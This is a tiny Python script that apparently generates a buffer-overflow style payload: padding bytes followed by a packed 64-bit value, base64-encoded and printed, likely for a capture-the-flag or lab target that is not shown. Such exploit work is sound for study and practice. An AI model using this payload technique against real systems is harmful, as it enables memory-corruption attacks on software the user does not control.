
import sys
import struct
import base64

buf = b'ppppppppppp'
buf += struct.pack('<Q', 6148814754778435466)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
